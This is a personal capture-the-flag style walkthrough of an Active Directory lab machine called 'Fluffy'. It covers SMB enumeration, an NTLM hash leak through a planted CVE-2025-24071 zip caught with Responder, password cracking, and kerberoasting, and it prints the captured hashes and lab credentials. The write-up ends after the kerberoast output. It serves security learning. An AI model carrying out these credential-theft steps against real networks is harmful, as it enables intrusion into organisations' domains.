## Intro

![](MediaFiles/Pasted%20image%2020250921133147.png)
Description:
```
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!, so its an assumed breach scenario
```
[[windows]] [[AssumedBreach]]  [[certificates]] [[certvulntoESC16]] [[shadowcredential]]
Tags: #windows #AssumedBreach  #certificates #certvulntoESC16 #shadowcredential
Tools used:
- smbclient (SMB enumeration)
- crackmapexec (SMB enumeration)
- responder (receiving incoming connection for NTLM leak)
- john the ripper (NTLM hash cracking)
- GetUserSPNs.py (identifying kerberoastable accounts)
- certipy (managing certificates)

-------
# Reconnaissance

add machine to etc/hosts
```shell
echo '10.10.11.69 fluffy.htb' | sudo tee -a /etc/hosts
```

lets start with our nmap scan
```shell
nmap fluffy.htb -sV -Pn -T4
```
output:
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 21:08 EEST
Nmap scan report for fluffy.htb (10.10.11.69)
Host is up (0.055s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 01:09:07Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.78 seconds
```
Discovered classic AD ports: DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (139/445), WinRM (5985), RPC (135/593). Host reported as `DC01` (Windows Server 2019).

Next, this is an assumed breach scenario, meaning we have already compromised a user (see machine's description):
```
j.fleischman
J0elTHEM4n1990!
```

## Correlating creds with services


```shell
nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```

i made a script for automatic the netexec procedure for the services i wanted to test

output:
```shell
┌─[ch3ckm8@parrot]─[~]
└──╼ $./nxc_services_checker.sh
[*] Checking mssql on fluffy.htb
[*] Checking smb on fluffy.htb
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
[*] Checking ftp on fluffy.htb
[*] Checking ldap on fluffy.htb
LDAP        10.10.11.69     389    fluffy.htb       [-] Error retrieving os arch of 10.10.11.69: Could not connect: timed out
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
[*] Checking rdp on fluffy.htb
[*] Checking ssh on fluffy.htb
[*] Checking winrm on fluffy.htb
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```
so right here, it seems that login to SMB is successful, so lets start there

## SMB enumeration as j.fleischman

Lets start enumerating shares with smb client
```Shell
smbclient -U j.fleischman -L fluffy.htb
```
output
```shell
└──╼ $smbclient -U j.fleischman -L fluffy.htb
Password for [WORKGROUP\j.fleischman]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

lets explore the IT share since it appears to be a non systemic/default one
```shell
smbclient -U j.fleischman //fluffy.htb/IT
```
output
```shell
└──╼ $smbclient //fluffy.htb/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  4 04:35:18 2025
  ..                                  D        0  Wed Jun  4 04:35:18 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 18:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 18:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 18:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 18:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 17:31:07 2025

		5842943 blocks of size 4096. 1328928 blocks available
```

### Inspecting share's contents

Lets download those locally and inspect them:
```shell
get Everything-1.4.1.1026.x64.zip
get KeePass-2.58.zip 
get Upgrade_Notice.pdf 
```

#### Inspecting the PDF file

- First, lets inspect the pdf file, there are 3 pages:
![Pasted image 20250603214807](MediaFiles/Pasted%20image%2020250603214807.png)
![Pasted image 20250603214703](MediaFiles/Pasted%20image%2020250603214703.png)
![Pasted image 20250603214845](MediaFiles/Pasted%20image%2020250603214845.png)
Interesting, the 2nd page of the pdf just gives out what the machine is vulnerable to:
```
CVE-2025-24996 | Critical
CVE-2025-24071 | Critical
CVE-2025-46785 | High
CVE-2025-29968 | High
CVE-2025-21193 | Medium
CVE-2025-3445  | Low
```
Lets analyze those CVEs one by one:

##### Analyzing the CVEs mentioned inside the PDF

- CVE-2025-24996 | Critical
https://www.cve.org/CVERecord?id=CVE-2025-24996
`External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.`
![Pasted image 20250603221600](MediaFiles/Pasted%20image%2020250603221600.png)

- CVE-2025-24071 | Critical
https://github.com/ThemeHackers/CVE-2025-24071
`The issue arises from the implicit trust and automatic file parsing behavior of .library-ms files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat. `
![Pasted image 20250603221728](MediaFiles/Pasted%20image%2020250603221728.png)
found this poc: https://github.com/0x6rss/CVE-2025-24071_PoC
keep that in mind for later, and lets find more about the rest of the CVEs:

- CVE-2025-46785 | High
`Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access.`
https://www.cvedetails.com/cve/CVE-2025-46785/
![Pasted image 20250603222002](MediaFiles/Pasted%20image%2020250603222002.png)

- CVE-2025-29968 | High
`Improper input validation in Active Directory Certificate Services (AD CS) allows an authorized attacker to deny service over a network.`
![Pasted image 20250603222047](MediaFiles/Pasted%20image%2020250603222047.png)

- CVE-2025-21193 | Medium
`Active Directory Federation Server Spoofing Vulnerability `
![Pasted image 20250603222230](MediaFiles/Pasted%20image%2020250603222230.png)

- CVE-2025-3445  | Low
https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVER-9689905
![Pasted image 20250603222357](MediaFiles/Pasted%20image%2020250603222357.png)
![Pasted image 20250603222437](MediaFiles/Pasted%20image%2020250603222437.png)
So we analyzed what each CVE describes, but in order to decide which one to chose i decided to also check the rest of the files in case any correlations with the CVEs exist:

### Inspecting the rest of the files

- then lets inspect the Everything-1.4.1.1026.x64.zip
![Pasted image 20250603214959](MediaFiles/Pasted%20image%2020250603214959.png)
hm we see an exe and an .lng file here... nothing comes to my mind except that it refers to an app called Everything, which is used for searching stuff on a windows machine.

- lets unzip the KeePass-2.58.zip 
![Pasted image 20250603215248](MediaFiles/Pasted%20image%2020250603215248.png)
From all those folders and files, the most interesting ones where:

KeePass-2.58.zip:

From the file name, we can see that the version is 2.58, which is also validated by its contents:
```xml
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
	<startup useLegacyV2RuntimeActivationPolicy="true">
		<supportedRuntime version="v4.0" />
		<supportedRuntime version="v2.0.50727" />
	</startup>
	<runtime>
		<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
			<dependentAssembly>
				<assemblyIdentity name="KeePass"
					publicKeyToken="fed2ed7716aecf5c"
					culture="neutral" />
				<bindingRedirect oldVersion="2.0.9.0-2.57.127.127"
					newVersion="2.58.0.0" />
			</dependentAssembly>
		</assemblyBinding>
		<enforceFIPSPolicy enabled="false" />
		<loadFromRemoteSources enabled="true" />
	</runtime>
	<appSettings>
		<add key="EnableWindowsFormsHighDpiAutoResizing" value="true" />
	</appSettings>
</configuration>
```
Interesting, it contains a publickey token, i dont know yet where it could be used

XSL folder:
![Pasted image 20250603215432](MediaFiles/Pasted%20image%2020250603215432.png)
To sump up:
KDBX_Common.xsl -> nothing interesting
KDBX_DetailsFull_HTML.xsl -> nothing interesting
KDBX_DetailsLight_HTML.xsl -> nothing interesting
KDBX_Tabular_HTML.xsl -> nothing interesting

Nothing interesting found by observing each one, overakk it appears to be some sort of `XSL` (Extensible Stylesheet Language), does not provide any additional information though regarding any CVE mentioned above. 

----
# Foothold

I decided to search for the most suitable CVE to exploit by severity starting with the `Critical` ones. 
By searching online i found an exploit for CVE-2025-24071

## Exploiting CVE-2025-24071 (Leaking NTLM hash)

Using this script: https://github.com/ThemeHackers/CVE-2025-24071
type your ip, and a random filename, and run, it should produce a `.zip` file as seen below (exploit.zip).

### Uploading the script via smbclient

then upload the automatically generated `exploit.zip` file through the smbclient: ( i am on the same directory as the exploit.zip thats why i dont specify path on the put command)
```shell
┌─[ch3ckm8@parrot]─[~]
└──╼ $smbclient //fluffy.htb/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.

smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (1,9 kb/s) (average 1,9 kb/s)
```

### Listen for incoming connections

run responder locally: 
```shell
responder -I tun0 -wvF
```

aaand we captured NTML hashes!
![Pasted image 20250603224638](MediaFiles/Pasted%20image%2020250603224638.png)
niiice, lets take on of those hashes with the prospect of cracking it:
```shell
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:2a097c3f1a0c7581:80E5B1A96F15F5076A3B681FF87BDE8C:010100000000000080099B54D9D4DB01990B5BC68162BEAB00000000020008004B0046005300530001001E00570049004E002D00490052004C005900440056004B0047004F003300590004003400570049004E002D00490052004C005900440056004B0047004F00330059002E004B004600530053002E004C004F00430041004C00030014004B004600530053002E004C004F00430041004C00050014004B004600530053002E004C004F00430041004C000700080080099B54D9D4DB010600040002000000080030003000000000000000010000000020000072DDB7D8290D0A32F8E8F001645979B3FC245530E93B4B6A0268EF43636C1BD50A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100340034000000000000000000
```

## Cracking NTLM hash

Put it on a txt (the whole NTLMv2-SSP Hash value), and attempted to crack it with john:
```shell
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
output
```shell
└──╼ $john hash.txt --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:02 DONE (2025-06-03 23:11) 0.4901g/s 2214Kp/s 2214Kc/s 2214KC/s promo010..programmer_pt
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
so now we have more creds:
```shell
p.agila
prometheusx-303
```
Next, we will check where we can login with these.

## Correlating creds with services

lets try to login now with these creds, by checking first with our nxc script:
```shell
[*] Checking mssql on fluffy.htb
[*] Checking ssh on fluffy.htb
[*] Checking winrm on fluffy.htb
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\p.agila:prometheusx-303
[*] Checking smb on fluffy.htb
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
[*] Checking ftp on fluffy.htb
[*] Checking ldap on fluffy.htb
LDAP        10.10.11.69     389    fluffy.htb       [-] Error retrieving os arch of 10.10.11.69: Could not connect: timed out
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
[*] Checking rdp on fluffy.htb
```
according to the output, with those creds we can login on `SMB` and `LDAP` 

## LDAP enumeration as p.agila

```shell
ldapsearch -x -H ldap://fluffy.htb -D "p.agila@fluffy.htb" -W -b "dc=fluffy,dc=htb" "(objectClass=group)"
```
this prints some interesting stuff but nothing too obvious, lets move on with the SMB enumeration

## SMB enumeration as p.agila

```shell
smbclient -U p.agila -L fluffy.htb
```
hm we see the user has access to the exact same shares, nothing valuable found regarding shares

lets try displaying more  info with crackmapexec, first for the users:

### Enumerating Users
```shell
crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --users
```
output:
```shell
└──╼ $crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --users
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Copying default configuration file
SMB         10.10.11.69     445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
SMB         10.10.11.69     445    DC01             [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.11.69     445    DC01             [+] Enumerated domain user(s)
SMB         10.10.11.69     445    DC01             fluffy.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.11.69     445    DC01             fluffy.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.11.69     445    DC01             fluffy.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.10.11.69     445    DC01             fluffy.htb\ca_svc                         
SMB         10.10.11.69     445    DC01             fluffy.htb\ldap_svc                       
SMB         10.10.11.69     445    DC01             fluffy.htb\p.agila                        
SMB         10.10.11.69     445    DC01             fluffy.htb\winrm_svc                      
SMB         10.10.11.69     445    DC01             fluffy.htb\j.coffey                       
SMB         10.10.11.69     445    DC01             fluffy.htb\j.fleischman    
```

### Enumerating Groups

```shell
crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --groups
```
output:
```shell
└──╼ $crackmapexec smb fluffy.htb -u p.agila -p 'prometheusx-303' --groups
SMB         10.10.11.69     445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
SMB         10.10.11.69     445    DC01             [+] Enumerated domain group(s)
SMB         10.10.11.69     445    DC01             Service Accounts                         membercount: 3
SMB         10.10.11.69     445    DC01             Service Account Managers                 membercount: 2
SMB         10.10.11.69     445    DC01             DnsUpdateProxy                           membercount: 0
SMB         10.10.11.69     445    DC01             DnsAdmins                                membercount: 0
SMB         10.10.11.69     445    DC01             Enterprise Key Admins                    membercount: 0
SMB         10.10.11.69     445    DC01             Key Admins                               membercount: 0
SMB         10.10.11.69     445    DC01             Protected Users                          membercount: 0
SMB         10.10.11.69     445    DC01             Cloneable Domain Controllers             membercount: 0
SMB         10.10.11.69     445    DC01             Enterprise Read-only Domain Controllers  membercount: 0
SMB         10.10.11.69     445    DC01             Read-only Domain Controllers             membercount: 0
SMB         10.10.11.69     445    DC01             Denied RODC Password Replication Group   membercount: 8
SMB         10.10.11.69     445    DC01             Allowed RODC Password Replication Group  membercount: 0
SMB         10.10.11.69     445    DC01             Terminal Server License Servers          membercount: 0
SMB         10.10.11.69     445    DC01             Windows Authorization Access Group       membercount: 1
SMB         10.10.11.69     445    DC01             Incoming Forest Trust Builders           membercount: 0
SMB         10.10.11.69     445    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
SMB         10.10.11.69     445    DC01             Account Operators                        membercount: 0
SMB         10.10.11.69     445    DC01             Server Operators                         membercount: 0
SMB         10.10.11.69     445    DC01             RAS and IAS Servers                      membercount: 0
SMB         10.10.11.69     445    DC01             Group Policy Creator Owners              membercount: 1
SMB         10.10.11.69     445    DC01             Domain Guests                            membercount: 0
SMB         10.10.11.69     445    DC01             Domain Users                             membercount: 0
SMB         10.10.11.69     445    DC01             Domain Admins                            membercount: 1
SMB         10.10.11.69     445    DC01             Cert Publishers                          membercount: 2
SMB         10.10.11.69     445    DC01             Enterprise Admins                        membercount: 1
SMB         10.10.11.69     445    DC01             Schema Admins                            membercount: 1
SMB         10.10.11.69     445    DC01             Domain Controllers                       membercount: 0
SMB         10.10.11.69     445    DC01             Domain Computers                         membercount: 0
SMB         10.10.11.69     445    DC01             Storage Replica Administrators           membercount: 0
SMB         10.10.11.69     445    DC01             Remote Management Users                  membercount: 1
SMB         10.10.11.69     445    DC01             Access Control Assistance Operators      membercount: 0
SMB         10.10.11.69     445    DC01             Hyper-V Administrators                   membercount: 0
SMB         10.10.11.69     445    DC01             RDS Management Servers                   membercount: 0
SMB         10.10.11.69     445    DC01             RDS Endpoint Servers                     membercount: 0
SMB         10.10.11.69     445    DC01             RDS Remote Access Servers                membercount: 0
SMB         10.10.11.69     445    DC01             Certificate Service DCOM Access          membercount: 1
SMB         10.10.11.69     445    DC01             Event Log Readers                        membercount: 0
SMB         10.10.11.69     445    DC01             Cryptographic Operators                  membercount: 0
SMB         10.10.11.69     445    DC01             IIS_IUSRS                                membercount: 0
SMB         10.10.11.69     445    DC01             Distributed COM Users                    membercount: 0
SMB         10.10.11.69     445    DC01             Performance Log Users                    membercount: 0
SMB         10.10.11.69     445    DC01             Performance Monitor Users                membercount: 0
SMB         10.10.11.69     445    DC01             Network Configuration Operators          membercount: 0
SMB         10.10.11.69     445    DC01             Remote Desktop Users                     membercount: 0
SMB         10.10.11.69     445    DC01             Replicator                               membercount: 0
SMB         10.10.11.69     445    DC01             Backup Operators                         membercount: 0
SMB         10.10.11.69     445    DC01             Print Operators                          membercount: 0
SMB         10.10.11.69     445    DC01             Guests                                   membercount: 2
SMB         10.10.11.69     445    DC01             Users                                    membercount: 3
SMB         10.10.11.69     445    DC01             Administrators                           membercount: 3

```
we see lots of groups. 

---------

[TODO] -> could i run bloodhound with the initial user? if yes add it here too prior to doing the foothold 
[TODO] -> had no patience, but is this way going to work in general? (except the fact that i did not run bloodhound to understand whats going on exaclty)
### Finding hashes of kerberoastable accounts

```shell
GetUserSPNs.py fluffy.htb/p.agila:prometheusx-303 -dc-ip 10.10.11.69 -request
```
output
```shell
└──╼ $python3 GetUserSPNs.py fluffy.htb/p.agila:prometheusx-303 -dc-ip 10.10.11.69 -request
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:07:50.136701  2025-05-22 01:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 03:51:16.786913  2025-06-04 04:33:27.044985             

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great
```

Lets sync with the domain and try again
```shell
ntpdate fluffy.htb
```

```shell
python3 GetUserSPNs.py fluffy.htb/p.agila:prometheusx-303 -dc-ip 10.10.11.69 -request
```
output:
```
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:07:50.136701  2025-05-22 01:21:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 19:17:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 03:51:16.786913  2025-06-04 04:33:27.044985             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$3f61cb5c82fab8ea78b41b82f4a9ed91$760e1176c349bbe95651bb7bc478312adf7246d6bf4b2eec568f2197cf1f502b1575c7c4f6f7c8361e4a913162abe0a664169f44b30e435f1efac0e99730993f38fbbfffa1e84fd7209d36d67d69eac8a779444d23d4ebfdbff025c5c6e60addb93310e289f86006fde5a86c45ff79b2677ec8466e2e077ff51d1ec813c8729363368f8c4eddb87344ef2189f84da99658d86a995f98b3ccdfaad9d21a9c9da5af9d287a88dbdf74a07fe9d4aab0a714db10b064d03996dfcda7a71e2ba72e5ac7c67cf708644733593ff2987f096b3d7fb7b3ec22fbcbd4cc81100d950c778d3e17533d128924f11c9990a968039b9e7549fa44b7c42b0890a2d90b86a9d932c7f4f00793a64a978e878f03b531582b60606f55da46f0f00fdb7d64f9782ce15d6c8aba05f815941267b1d349ca7004a0c39731863824eafedda03ef4093ef40ea5ffcba9848af0f844f6c551730da8fe2cda2528882d839fe4e521b26885a4fa5b825d4458894f5b2c821e70ff31da70e558aa5c5bce791eed7e09dc808dc4ed7e53b54a9a4b9b6109da0e4143b64b6588717e02b9b3e407b53eb262b9be4e48cad6e3e150f8c5b5690b923fa465d13bb34fefa22fe7082aa36df7068f268af1e287e97743c61d6ef16001dd45eadba8397487311d79e210aa1f98df3398533a9c9774b15b3ee74a74b194725aeaffc2905acc393bd75aa46c3f3b9caacab38817cff747888efbf20dc05f70bbaa535cdf3acd0778eef347076f14d2f70661dcdd5b17366574b92b6c0aaa6038dc9a4180bb4e3676f96740fb209f1c7bddc52caf74ef2c97e5c3fbf2de31aa0ac545274094f392981b3111fed09759cfc4386da46d7081957754a002493df6b7a4a16e49f4b82fe07795ff6383ce37c2eedc4188fdf49115768c18bd562d23a0ca3859627f6a592d032a56a77c31059d71e49e75443d28b695dcad129c54cb4ee82f57c554e6e3d0dcc0bb749ec3fea7fa4ba3f879d17ad1f29e71db0b3f4a1784a42bb2d8ea892e1e4a616dfba28af107628a4d973500ee52459f7b9410c3da4b582559e2a9751e8f6199bb78fdf31a84eeb062ac02bf0c5d59a6772c896ae03e4b051d6ecf1d4f88819a3c6bad436bdb315d22c8c3a77f3329d1718e717436b9c68c159ebf69a3177653c77171fc195654fe198ab6cd761ee72826eeba26fcb2672ab39bc9db0889b178e914c9e6d5a6aefa0ff5bcaa894a2b0ceb95b08be3e6ee3b15a939ef3a50325ea407555b653a3b8670ea22061d3823395fb58a20d6868acbbc267d53cfa1eae6929b194eb038140a5f885b20833e24c9131fbade500aedb93de71a8360213c191e03b73fa695ac36f3e49f7333a77411de6142d4367c9eba47b23e2a6489ecfb19bee5afd6f105cdf2cf05a28513aa61c4725a49fbc4a827550e08d306fb58e639f450623b979e13eebafddd8df0deea6db1b6265291f2f2df2835050dc874686e514be03eadda94b7
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$775a1ab850490bb54f9d6035783564bf$e9198ec9e9e34d60de08f81af8ff92fdd5228cd56fc8b326c597aec4460c308b03d3312b9ef5fa76fb2714937fb0b12d0123fd3f585b766fe9e4fcc1b38206000b89f008cf8ef73275b6c205660c0b214db64a3e9640dcb4fba64ed19a134433d26dc3479b6c8a9e47cf54bd4a3872e07281a3ccc6a33148e1634731cc6aa1ae2844d8e372e1e4cc3ca6b74f3f9481127571902d8410605b0290ba6dba0bba0ca566935f99c0b03f36c4b37cd7c2ec141b50c44721de33d9801629d969a815430a696416c9ac78dcd20c0f78424c00e6678c3afff5f0fae58c959370506cc1c56f2e6489f4c577dc5c138d04ad0dafbcc43f0f98a8a9014990bf9b8720abacfe279fb436124c2cb5227bf2a2bdfb0ee3068e895ac90f3c5de44105a0d2e78a58264c0bee809b8b2aa38724e94973e3d78cb23a25aafe148ac716fc502aa28516a3a19e73df3fd861a3200cea46b936721a2cd1269b868bf65d77475e083d534a7de3ef170da9b0ba3429b9a9f9fa3b3250b41ffef0bef4a00732f8e76f2350a1cc242df66f5e1e1f120f23221a974a7db662bf8dba78b7fd99993bb3f70c23a9dcbb4e00380152e9b93cb3924636fa15ba49e7fbb268df94eb639101cf0bc328331f0258f7c8aea87497b58b6c134b9ab71daf024ab7b85783378cf83e4cf3811591a8af30d91c0cb5f7358238056a652ae3b590fec8828e49851fb68f112dd5cafb63c6890585bb25fb376fbe64b0cf816f3f908df14ef0503d2b1170b75f1e7355af1994e0caec63d36f13d718e94c4ba56744d250517dfbe80ca085d5fc159c4a019868cc4a13184fddc6f42692d6b121561b3805d36a1a8fbf7b07ea85d97c9a22682c9f7458f62cf0163652f67af349ec5751cf86ed261f5efdd7e505710005ff3a6e3e8eebb13316807d77c99bb0f94217bf338da13f8f6626276d63cccea402225ccab20185b840618767b1f1b4ea1708ccb8bf858d6578decd9c0b3eaa3d141fe8f6dafa8001359ecf5a5510eccbee7fd08ee6ccbc52a3352585b69fd6f30972ad6a5e658717e75f5ba4e5fb5f2295364bd0e96bb0c94bac0f75819004adc702277a1da8d9d4709190ae6e4f9c516daafab76af39e4236711566bfb2d060dad4aa28263e3e17c55cdbd75623aab2c570bbc78123c33f47d3d159c97a806c9d5acda3d649a712d0db70e125dd9a2a5de6f94567465376509aba941dd768620637d99bc4a693624f181ca1b94e1fe29e6e054e35f0e9ae6906ac5523191ccd3cf8ec91a11c7d34841977604eb9a7b36cd7fd49e5fdc8857f2b099fc87d3e734d2db25f8961bbd06154ca32dd8e4b91773b823bd19c964850f79c8c6818031d130883ee43dcb92b385970b482a9e5c81b1f8cfc82a71a6b054cbd8f28a2bc7059f593dffb97a5bed21beba857213a3479269a066fa6b117a428118305fc6d5c44dd9054483bf68c494d7b9a6544983a80d3b925a055feb63c9a804c9631eef0
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$55e2bb000898ea80138be5e88c4e1e4f$5099f0030807c7c4f3444c8caeab7de469fa97c7a857125a6c0f506d2ccabac9da60271f46834a769e84b5605b5d5127ac72efe61e7611758898ab9226588ca9010e40e8485d22076f98a01052c1734a56c09126407c3ed8cdd35d1701665838ffe24fbfed09a4dc840659294c5970b6f7484254d07ad23a71385a3abf2af69eedc9f60826051cbcb5acd43aab96c7d55ad75dd310cac8a9c6ba94fa6e65dafb6bc1461ca688553f58ddd234c2cc0578419f4630798051b303712065b154af3770a3afc4388c00865a63b11a2f5463c11e1252ea7cc504c50d2940c24665f5adf9e7920341295762c98b57c50c5ddbd2bdd1b35a86b31e03b787fcde9f6e854d7880e2bfb53c71ab3af2055fd1311a5fdcdeb673066bfd7c641e559af6636f078909020aec5b71cdf6676c5e9f9beeb9ba4dda8c21426ea2288103d0228f72ffceeeea5317e715fe0646cadf82b337d95cb61e3590a91535d9ddfb9126203c797406bcbf9a8250c6ad2995b980cde4d3255b766cd23a9873bbc8267ad2ade206b8087aa86add94638c6a4cc85341106c818034e79007fa13e766652eeb15263117c5b4e3bb708632ac416550fa4c1f470d0484a7157fd39bd021e70445a163305a7031ab3636d100fa1e776e280980111940e9b6e69fccdf4a815ec30e76e5155569e31af8ad041f065365fdc46b3b0f8ac162f7dac20ab6eddf235765de93102e58951abf94fa0691800d9396dc31047159c4f688469d7ece16165b3332920461897d3fa4fafc5cac2332fe1323154398c3cc1ddc08025531e0cd5b80b95d5b9e46256fd60cabc9f1be360c590a76324fb1ff52217c162af004c1c1bdd0b24f8ff7f855f7c23628b9b6606ed2a25045fe2980ac533c6eae7d47be985a49603c82c2c297e1aa5e1660662c018b9e08f8279d18139ccea101137bb36c0f4a456da78d3a7c3ed52c478f92adff3ea6c3b7c645f4dec16382b3748688c430b4186946e2291d60407e402e97f276d0665a7bc9fe424afb6c2d51cadab102a00922eb232d6021463cc6d926fb9fed46229cb947dabcd3168b0eeaf20214dec207c1ce1d8aa1664b013fe6108240e3bb6beca7681fb77118f1858ce3d1cfdb72ee9f2d082c7d6907c9309bfa681f0776dceb2559461f301c8543104fbd7c193a3d81809533b01bf84986cf29a7a11e477836c148df7d68d35211064aea88d4cc1cafbd85792aad9298dfd0aa7234337949156b2d6f37b19fa3b0b399a313cd4593cf7e8a53f6cc46cb576526a3125ea7cdc93b6cae39e5d5e49f0861b51ac411e85b1c68d5bfbf7065bba78c58b98f13f26176cfffa777dddace5a65ceeee798ee57c5f4c719a478e65eef199b408838f9b23b04a32a7b102e35a0998d1ccfa445499c6c0a440050f67f74e0dc846aad11232680760177a43e3a3935d90e7d039f95